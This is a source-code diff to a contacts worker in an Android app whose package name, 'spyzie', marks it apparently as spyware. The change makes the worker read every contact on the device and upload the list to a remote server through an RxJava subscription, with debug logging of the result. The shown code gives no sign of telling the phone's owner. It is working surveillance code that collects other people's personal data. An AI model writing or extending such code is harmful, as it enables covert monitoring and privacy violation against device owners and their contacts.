@@ -11,11 +11,13 @@ import androidx.work.Worker;
 import androidx.work.WorkerParameters;
 
 import com.tantd.spyzie.SpyzieApplication;
+import com.tantd.spyzie.data.model.CommonResponse;
 import com.tantd.spyzie.data.model.Contact;
 import com.tantd.spyzie.data.model.Error;
 import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.util.CommonUtils;
 import com.tantd.spyzie.util.Constants;
+import com.tantd.spyzie.util.rx.SchedulerProvider;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -28,9 +30,12 @@ import javax.inject.Inject;
 public class GetContactsWorker extends Worker {
 
     public static final String GET_CONTACTS_WORK_REQUEST = "GET_CONTACTS_WORK_REQUEST";
+    private static final String DEBUG_SUB_TAG = "[" + GetContactsWorker.class.getSimpleName() + "] ";
 
     @Inject
     ApiManager mApiManager;
+    @Inject
+    SchedulerProvider mSchedulerProvider;
 
     public GetContactsWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -42,11 +47,26 @@ public class GetContactsWorker extends Worker {
         SpyzieApplication.getInstance().getServiceComponent().inject(this);
 
         if (CommonUtils.hasContactPermission(getApplicationContext())) {
-            mApiManager.sendContactsData(getAllContacts());
+            mApiManager.sendContactsData(getAllContacts()).subscribeOn(mSchedulerProvider.io())
+                    .observeOn(mSchedulerProvider.ui())
+                    .subscribe(commonResponse -> handleSendingSuccess(commonResponse),
+                            error -> handleSendingError(error));
             return Result.success();
         } else {
             mApiManager.sendExceptionTracking(Error.HAS_NO_READ_CONTACTS_PERMISSION);
             return Result.failure();
+        }
+    }
+
+    private void handleSendingSuccess(CommonResponse commonResponse) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "Success, response=" + commonResponse);
+        }
+    }
+
+    private void handleSendingError(Throwable error) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "Error: " + error);
         }
     }
 
